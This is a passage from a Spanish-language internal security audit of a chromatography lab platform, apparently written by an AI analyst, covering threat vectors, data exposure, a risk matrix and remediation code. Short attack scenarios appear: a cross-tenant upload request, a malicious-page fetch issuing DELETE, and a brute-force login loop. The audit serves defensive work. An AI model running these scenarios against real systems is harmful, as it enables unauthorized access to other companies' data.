   - Robar datos de la empresa de la víctima
   - Modificar análisis
   - Crear/eliminar registros
```

**Probabilidad:** MEDIA (requiere encontrar XSS, pero localStorage es vulnerable)
**Impacto:** ALTO (compromiso de cuenta, acceso a datos sensibles)

**Controles Mitigantes Actuales:**

- ✅ TypeScript reduce errores
- ✅ React escapa HTML por defecto
- ❌ Sin CSP
- ❌ Tokens en localStorage (vulnerable)

**Remediación:**

1. Migrar a httpOnly cookies
2. Implementar CSP estricto
3. Auditar inputs para XSS

---

### Vector 3: ⚠️ ALTO - Escalación de Privilegios en Cromatografía

**Escenario:**

```
1. Atacante crea cuenta como COMPANY_ADMIN de Empresa A
2. Obtiene token JWT válido
3. Explota falta de RBAC en ChromatographyViewSet:

POST /api/v1/chromatography/analyses/upload-xlsx/
Authorization: Bearer <token_empresa_A>
Content-Type: multipart/form-data

{
  "xlsx_file": <archivo_malicioso>,
  "company_id": "<uuid_empresa_B>"  // ❌ Acepta cualquier company_id
}

4. Sistema crea análisis para Empresa B sin validar permisos
5. Atacante puede:
   - Ver análisis de Empresa B: GET /api/v1/chromatography/analyses/company/<uuid_B>/
   - Modificar análisis de Empresa B
   - Eliminar análisis de Empresa B
   - Generar reportes falsos para Empresa B
```

**Probabilidad:** ALTA (solo requiere autenticación)
**Impacto:** ALTO (acceso no autorizado a datos de otras empresas)

**Controles Mitigantes Actuales:**

- ✅ Autenticación requerida
- ❌ Sin validación de company_id contra usuario
- ❌ Sin CanManageAnalyses permission

**Remediación:**

```python
# En ChromatographicAnalysisViewSet
def upload_xlsx(self, request):
    company_id = data.get("company_id")

    # AGREGAR VALIDACIÓN
    if request.user.role != UserRole.OWNER:
        if str(request.user.company_id) != company_id:
            raise PermissionDenied()

    # ... resto del código
```

---

### Vector 4: ⚠️ MEDIO - CSRF en Desarrollo

**Escenario:**

```
1. Víctima autenticada navega a sitio malicioso
2. Sitio malicioso hace request a API en desarrollo:

<script>
  fetch('http://localhost:8000/api/v1/companies/', {
    method: 'DELETE',
    headers: {
      'Authorization': 'Bearer <token_robado>'
    }
  });
</script>

3. CORS_ALLOW_ALL_ORIGINS=True permite el request
4. Request se ejecuta con credenciales de la víctima
```

**Probabilidad:** BAJA (solo en desarrollo, requiere token)
**Impacto:** MEDIO (modificación/eliminación de datos)

**Controles Mitigantes Actuales:**

- ❌ CORS permisivo en desarrollo
- ✅ CORS restringido en producción

**Remediación:**

- Restringir CORS incluso en desarrollo

---

### Vector 5: ⚠️ MEDIO - Reutilización de Token después de Logout

**Escenario:**

```
1. Usuario hace logout en la aplicación
2. Sistema limpia localStorage
3. ❌ Token JWT NO se invalida en backend
4. Atacante que había robado el token previamente puede:
   - Seguir usando el token hasta que expire naturalmente
   - Acceder a la cuenta aunque el usuario haya cerrado sesión
   - Realizar operaciones en nombre del usuario
```

**Probabilidad:** MEDIA (requiere robo previo del token)
**Impacto:** MEDIO (acceso no autorizado post-logout)

**Controles Mitigantes Actuales:**

- ✅ Cache se limpia
- ❌ Token no se invalida en Supabase
- ❌ Sin lista negra de tokens

**Remediación:**

```python
# En LogoutView
def post(self, request):
    token = request.META.get('HTTP_AUTHORIZATION', '').split(' ')[1]

    # Invalidar en Supabase
    supabase_client.auth.sign_out(token)

    # Agregar a lista negra (Redis)
    cache.set(f"blacklist_token_{token}", True, timeout=3600)
```

---

### Vector 6: ⚠️ BAJO - Fuerza Bruta en Login

**Escenario:**

```
1. Atacante obtiene lista de emails (de LinkedIn, breaches, etc.)
2. Atacante ejecuta ataque de fuerza bruta:

for password in common_passwords:
    POST /api/v1/auth/login
    {"email": "victim@company.com", "password": password}

3. Rate limit actual: 100/hora para anónimos
   → 100 intentos por hora
   → Suficiente para probar contraseñas comunes
```

**Probabilidad:** BAJA (rate limit existe, pero podría ser más restrictivo)
**Impacto:** MEDIO (compromiso de cuenta con contraseña débil)

**Controles Mitigantes Actuales:**

- ✅ Rate limit general: 100/hora
- ❌ Sin rate limit específico para login
- ❌ Sin lockout después de X intentos fallidos

**Remediación:**

```python
# En LoginView, agregar throttle específico
class LoginView(APIView):
    throttle_classes = [LoginRateThrottle]  # 5/hora por IP

# En settings.py
'DEFAULT_THROTTLE_CLASSES': [
    'rest_framework.throttling.AnonRateThrottle',
    'rest_framework.throttling.UserRateThrottle',
    'apps.authentication.throttles.LoginRateThrottle',
],
'DEFAULT_THROTTLE_RATES': {
    'anon': '20/hour',
    'user': '500/hour',
    'login': '5/hour',  # Muy restrictivo para login
}
```

---

## EXPOSICIÓN DE DATOS SENSIBLES

### 1. Datos Expuestos por Falta de RLS

| Tabla                      | Datos Sensibles                  | Nivel de Criticidad | Impacto Comercial                        |
| -------------------------- | -------------------------------- | ------------------- | ---------------------------------------- |
| `companies`                | Nombres, contactos, localidades  | ⚠️ ALTO             | Competidores conocen cartera de clientes |
| `chromatographic_analyses` | Composición química, propiedades | ❌ CRÍTICO          | Ventaja competitiva comprometida         |
| `user_profiles`            | Emails, roles, company_id        | ⚠️ ALTO             | Phishing dirigido, ingeniería social     |
| `samples`                  | Códigos, tipos de análisis       | ⚠️ MEDIO            | Información operativa de clientes        |
| `analyses`                 | Resultados de análisis           | ⚠️ ALTO             | Datos técnicos sensibles                 |
| `reports`                  | Rutas de archivos                | ⚠️ BAJO             | Path disclosure                          |

### 2. Datos Expuestos en Frontend (localStorage)

```javascript
// ❌ Visible en DevTools > Application > Local Storage
{
  "accessToken": "eyJhbGciOi...",  // JWT completo con claims
  "refreshToken": "eyJhbGci...",   // Refresh token de larga duración
  "user": {                         // Información del usuario
    "user_id": "uuid",
    "email": "user@company.com",
    "name": "Usuario Nombre",
    "role": "company_admin",
    "company_id": "uuid"
  }
}
```

**Riesgos:**

- Accesible a cualquier script JavaScript (XSS)
- Accesible a extensiones del navegador
- No se limpia automáticamente (persiste entre sesiones)
- Visible en backups/snapshots del navegador

### 3. Datos Expuestos en Variables de Entorno

**Backend (.env):**

```bash
# ❌ CRÍTICO: Credenciales en texto plano
SECRET_KEY=django-secret-key-here
SUPABASE_SERVICE_ROLE_KEY=eyJhbGci...  # Acceso administrativo total
DB_PASSWORD=password123                 # Contraseña de BD

# ⚠️ ALTO: URLs y configuración
SUPABASE_URL=https://xxx.supabase.co
DB_HOST=db.xxx.supabase.co
```

**Frontend (.env.local):**

```bash
# ⚠️ MEDIO: Visible en bundle
NEXT_PUBLIC_API_URL=https://api.evolutionchemical.com/api/v1
```

**Riesgos:**

- Si .env se commitea a Git, queda expuesto permanentemente
- Backups de servidor pueden incluir credenciales
- NEXT*PUBLIC* variables terminan en el bundle del cliente

### 4. Datos Expuestos en Logs

**Backend logs pueden incluir:**

```python
# LoggingMiddleware registra:
logger.info(f"Request: {request.method} {request.path}")
# ⚠️ Podría loguear datos sensibles en query params:
# GET /api/v1/users/?email=victim@company.com
```

**Recomendación:**

- Sanitizar logs para no incluir PII
- Enmascarar tokens en logs
- Rotar logs frecuentemente

### 5. Datos Expuestos en Respuestas de API

**Ejemplo: GET /api/v1/auth/me**

```json
{
  "user_id": "uuid",
  "email": "user@company.com",
  "name": "Usuario Nombre",
  "role": "company_admin",
  "company_id": "uuid",
  "company_name": "Empresa Cliente" // ⚠️ Expone nombre de empresa
}
```

**Minimización recomendada:**

- Solo devolver datos necesarios para el frontend
- Evitar exponer IDs internos si es posible
- Usar DTOs para controlar exactamente qué se expone

---

## MATRIZ DE RIESGO

### Clasificación de Riesgos

| #   | Vulnerabilidad                  | Probabilidad | Impacto    | Riesgo         | Prioridad |
| --- | ------------------------------- | ------------ | ---------- | -------------- | --------- |
| 1   | Base de datos sin RLS           | 🔴 ALTA      | 🔴 CRÍTICO | 🔴 **CRÍTICO** | **P0**    |
| 2   | Tokens en localStorage (XSS)    | 🟡 MEDIA     | 🔴 ALTO    | 🔴 **ALTO**    | **P1**    |
| 3   | ChromatographyViewSet sin RBAC  | 🔴 ALTA      | 🔴 ALTO    | 🔴 **ALTO**    | **P0**    |
| 4   | CORS permisivo en desarrollo    | 🟡 MEDIA     | 🟡 MEDIO   | 🟡 **MEDIO**   | **P2**    |
| 5   | Logout no invalida token        | 🟡 MEDIA     | 🟡 MEDIO   | 🟡 **MEDIO**   | **P2**    |
| 6   | Sin CSP                         | 🟡 MEDIA     | 🔴 ALTO    | 🔴 **ALTO**    | **P1**    |
| 7   | Cache en memoria (no escalable) | 🟡 MEDIA     | 🟡 MEDIO   | 🟡 **MEDIO**   | **P2**    |
| 8   | SSL redirect deshabilitado      | 🟢 BAJA      | 🔴 ALTO    | 🟡 **MEDIO**   | **P2**    |
| 9   | Rate limiting generoso          | 🟢 BAJA      | 🟡 MEDIO   | 🟢 **BAJO**    | **P3**    |
| 10  | SECRET_KEY con default          | 🟢 BAJA      | 🔴 ALTO    | 🟡 **MEDIO**   | **P2**    |
| 11  | Uso de anon_key vs service_role | 🟢 BAJA      | 🟡 MEDIO   | 🟢 **BAJO**    | **P3**    |

### Leyenda de Probabilidad

- 🔴 **ALTA:** Muy fácil de explotar, herramientas públicas disponibles
- 🟡 **MEDIA:** Requiere conocimientos técnicos moderados
- 🟢 **BAJA:** Requiere conocimientos avanzados o condiciones específicas

### Leyenda de Impacto

- 🔴 **CRÍTICO:** Compromiso total del sistema, pérdida de datos, daño reputacional
- 🔴 **ALTO:** Acceso no autorizado a datos sensibles, modificación de datos
- 🟡 **MEDIO:** Degradación del servicio, exposición limitada de datos
- 🟢 **BAJO:** Impacto mínimo, información técnica expuesta

### Leyenda de Prioridad

- **P0:** INMEDIATO (0-1 semana)
- **P1:** URGENTE (1-2 semanas)
- **P2:** ALTA (2-4 semanas)
- **P3:** MEDIA (1-2 meses)

---

## RECOMENDACIONES PRIORITARIAS

### 🔴 P0: INMEDIATO (Debe hacerse YA)

#### 1. Implementar Row Level Security en Supabase

**Impacto:** Protege la base de datos a nivel fundamental

**Acciones:**

```sql
-- 1. Habilitar RLS en todas las tablas críticas
ALTER TABLE user_profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE companies ENABLE ROW LEVEL SECURITY;
ALTER TABLE chromatographic_analyses ENABLE ROW LEVEL SECURITY;
ALTER TABLE samples ENABLE ROW LEVEL SECURITY;
ALTER TABLE analyses ENABLE ROW LEVEL SECURITY;
ALTER TABLE reports ENABLE ROW LEVEL SECURITY;

-- 2. Aplicar políticas (ver sección de RLS arriba)
```

**Tiempo estimado:** 4-6 horas (testing incluido)
**Responsable:** DBA + Backend Developer
**Verificación:** Intentar queries no autorizados y confirmar que fallan

---

#### 2. Agregar Validación de Permisos en ChromatographyViewSet

**Impacto:** Previene acceso no autorizado a análisis de otras empresas

**Acciones:**

```python
# apps/chromatography/views.py

class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
    permission_classes = [permissions.IsAuthenticated, CanManageAnalyses]

    def get_queryset(self):
        queryset = ChromatographicAnalysis.objects.all()

        # Filtrar por empresa si no es OWNER
        if self.request.user.role != UserRole.OWNER:
            queryset = queryset.filter(company_id=self.request.user.company_id)

        return queryset

    @action(detail=False, methods=["POST"])
    def upload_xlsx(self, request):
        company_id = data.get("company_id")

        # VALIDAR PERMISOS
        if request.user.role != UserRole.OWNER:
            if str(request.user.company_id) != company_id:
                raise PermissionDenied("No puede crear análisis para otra empresa")

        # ... resto del código

    @action(detail=False, methods=["GET"])
    def by_company(self, request, company_id=None):
        # VALIDAR PERMISOS
        if request.user.role != UserRole.OWNER:
            if str(request.user.company_id) != company_id:
                raise PermissionDenied()

        # ... resto del código
```

**Tiempo estimado:** 2-3 horas (testing incluido)
**Responsable:** Backend Developer
**Verificación:**

- Usuario de empresa A intenta subir análisis para empresa B → 403 Forbidden
- Usuario de empresa A intenta ver análisis de empresa B → 403 Forbidden
- OWNER puede hacer todo → Success

---

### 🔴 P1: URGENTE (1-2 semanas)

#### 3. Migrar a httpOnly Cookies para Tokens

**Impacto:** Protege contra XSS

**Acciones Backend:**

```python
# apps/authentication/views.py

class LoginView(APIView):
    def post(self, request):
        # ... validación ...

        response = Response({
            "message": "Login exitoso",
            "user": user_data
            # ❌ NO enviar tokens en response body
        })

        # ✅ Enviar tokens en httpOnly cookies
        response.set_cookie(
            key='accessToken',
            value=access_token,
            httponly=True,
            secure=True,  # Solo HTTPS
            samesite='Strict',
            max_age=3600  # 1 hora
        )

        response.set_cookie(
            key='refreshToken',
            value=refresh_token,
            httponly=True,
            secure=True,
            samesite='Strict',
            max_age=604800  # 7 días
        )

        return response
```

**Acciones Frontend:**

```typescript
// src/modules/auth/services/AuthService/AuthService.ts

class AuthService {
  // ❌ Eliminar almacenamiento en localStorage
  // localStorage.setItem('accessToken', token);

  // ✅ Las cookies se envían automáticamente
  async login(email: string, password: string) {
    const response = await apiClient.post('/auth/login', { email, password });
    // Cookies ya están configuradas por el backend
    return response.data.user;
  }

  isAuthenticated(): boolean {
    // ✅ Verificar con endpoint del backend
    // O confiar en que el navegador envía la cookie
    return true; // Simplificado
  }
}
```

**Tiempo estimado:** 1 semana (cambio en ambos lados + testing)
**Responsable:** Backend + Frontend Developers
**Verificación:** Verificar en DevTools que no hay tokens en localStorage

---

#### 4. Implementar Content Security Policy (CSP)

**Impacto:** Protección contra XSS a nivel de navegador

**Acciones:**

```javascript
// next.config.js

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://api.evolutionchemical.com https://*.supabase.co",
              "frame-ancestors 'none'",
              "base-uri 'self'",
              "form-action 'self'",
            ].join('; '),
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
        ],
      },
    ];
  },
};
```

**Tiempo estimado:** 1 día (configuración + testing)
**Responsable:** Frontend Developer
**Verificación:** Verificar headers en DevTools > Network

---

### 🟡 P2: ALTA (2-4 semanas)

#### 5. Restringir CORS en Desarrollo

```python
# config/settings/development.py
CORS_ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://127.0.0.1:3000",
]
CORS_ALLOW_CREDENTIALS = True
```

#### 6. Invalidar Tokens en Logout

```python
# apps/authentication/views.py
def post(self, request):
    token = request.META.get('HTTP_AUTHORIZATION', '').split(' ')[1]
    supabase_client.auth.sign_out(token)
    cache.set(f"blacklist_{token}", True, timeout=3600)
    cache.delete(f"user_profile_{request.user.user_id}")
    return Response({"message": "Logout exitoso"})
```

#### 7. Migrar Cache a Redis

```python
# config/settings/base.py
CACHES = {
    'default': {
        'BACKEND': 'django_redis.cache.RedisCache',
        'LOCATION': env('REDIS_URL', default='redis://127.0.0.1:6379/1'),
        'OPTIONS': {
            'CLIENT_CLASS': 'django_redis.client.DefaultClient',
        }
    }
}
```

#### 8. Forzar SSL Redirect

```python
# config/settings/production.py
SECURE_SSL_REDIRECT = True  # Forzar HTTPS
```

#### 9. Eliminar Default de SECRET_KEY

```python
# config/settings/base.py
if env("ENVIRONMENT") == "production":
    SECRET_KEY = env("SECRET_KEY")  # Sin default
else:
    SECRET_KEY = env("SECRET_KEY", default="dev-key-only")
```

---

### 🟢 P3: MEDIA (1-2 meses)

#### 10. Rate Limiting Más Restrictivo

```python
'DEFAULT_THROTTLE_RATES': {
    'anon': '20/hour',
    'user': '500/hour',
    'login': '5/hour',
}
```

#### 11. Usar service_role_key en Backend

```python
supabase_admin_client = create_client(
    env("SUPABASE_URL"),
    env("SUPABASE_SERVICE_ROLE_KEY")
)
```

#### 12. Auditoría de Logs

- Sanitizar logs para no incluir PII
- Implementar log rotation
- Monitoreo de accesos sospechosos

---

## PLAN DE REMEDIACIÓN

### Fase 1: Crítico (Semana 1)

```
Día 1-2: Implementar RLS en Supabase
- Habilitar RLS en todas las tablas
- Crear funciones helper
- Aplicar políticas
- Testing exhaustivo

Día 3-4: Agregar validación en ChromatographyViewSet
- Implementar CanManageAnalyses permission
- Validar company_id en todos los endpoints
- Testing de accesos no autorizados

Día 5: Testing integral y deployment
- Smoke tests
- Verificar que usuarios normales funcionan
- Verificar que accesos no autorizados fallan
- Deploy a staging
- Deploy a producción
```

### Fase 2: Urgente (Semana 2-3)

```
Semana 2: Migrar a httpOnly Cookies
- Backend: Modificar endpoints de auth
- Frontend: Eliminar localStorage, adaptar AuthService
- Testing de flujo completo de auth
- Deploy escalonado

Semana 3: Implementar CSP y Headers de Seguridad
- Configurar next.config.js
- Testing de CSP (verificar que no rompe funcionalidad)
- Ajustar políticas si es necesario
- Deploy
```

### Fase 3: Alta Prioridad (Semana 4-6)

```
Semana 4-5: Mejoras de Backend
- Restringir CORS
- Invalidar tokens en logout
- Migrar cache a Redis (requiere infraestructura)
- Forzar SSL redirect
- Eliminar defaults inseguros

Semana 6: Testing y Monitoreo
- Pentesting interno
- Verificar logs de seguridad
- Ajustes finales
```

### Fase 4: Mejora Continua (Mes 2-3)

```
- Rate limiting más restrictivo
- Auditoría de logs
- Rotación de secrets
- Pentesting externo (opcional)
- Capacitación del equipo en secure coding
```

---

## CHECKLIST DE VERIFICACIÓN

### Después de Implementar RLS

- [ ] Intentar `SELECT * FROM companies` como usuario normal → Debe fallar o filtrar
- [ ] Intentar `SELECT * FROM chromatographic_analyses` como COMPANY_ADMIN → Solo ver propios
- [ ] Verificar que OWNER puede ver todo
- [ ] Intentar `DELETE FROM user_profiles` como COMPANY_ADMIN → Debe fallar
- [ ] Verificar que operaciones legítimas funcionan

### Después de Migrar a Cookies

- [ ] Login exitoso → No hay tokens en localStorage
- [ ] DevTools > Application > Cookies → Ver accessToken y refreshToken con httpOnly=true
- [ ] Navegación normal funciona → Cookies se envían automáticamente
- [ ] Logout → Cookies se eliminan
- [ ] Intento de acceso a localStorage.getItem('accessToken') → null

### Después de Implementar CSP

- [ ] DevTools > Console → Sin errores de CSP
- [ ] Funcionalidad normal no está rota
- [ ] DevTools > Network → Ver headers CSP en responses
- [ ] Intentar script inline malicioso → Debe ser bloqueado

---

## CONCLUSIONES Y RECOMENDACIONES FINALES

### Estado Actual

El sistema presenta una **arquitectura de seguridad parcialmente implementada** con buenas prácticas en autenticación y RBAC, pero con **vulnerabilidades críticas** que exponen datos sensibles:

1. **Base de datos completamente abierta** (sin RLS)
2. **Tokens vulnerables a XSS** (localStorage)
3. **Permisos insuficientes en módulo crítico** (cromatografía)

### Prioridades Absolutas

1. ✅ **Implementar RLS** - Sin esto, cualquier usuario autenticado puede acceder a todo
2. ✅ **Agregar validación en Cromatografía** - Módulo más crítico sin protección adecuada
3. ✅ **Migrar a httpOnly cookies** - Proteger tokens contra XSS

### Cultura de Seguridad

Recomendaciones para el equipo:

- 🔐 **Security by default:** Denegar acceso por defecto, permitir explícitamente
- 🧪 **Testing de seguridad:** Incluir casos de "acceso no autorizado" en tests
- 📝 **Code review con foco en seguridad:** Revisar permisos en cada PR
- 🎓 **Capacitación:** OWASP Top 10, secure coding practices
- 📊 **Monitoreo:** Implementar alertas de accesos sospechosos

### Próximos Pasos

1. Priorizar remediación según matriz de riesgo
2. Asignar recursos para Fase 1 (crítico)
3. Considerar pentesting externo después de Fase 3
4. Establecer proceso de security review para nuevos features

---

## CONTACTO Y SOPORTE

**Analista:** Claude Sonnet 4.5
**Fecha:** 2026-05-25
**Versión del documento:** 1.0

Para consultas sobre este análisis o implementación de remediaciones, contactar al equipo de desarrollo.

---

**CONFIDENCIAL - SOLO PARA USO INTERNO**
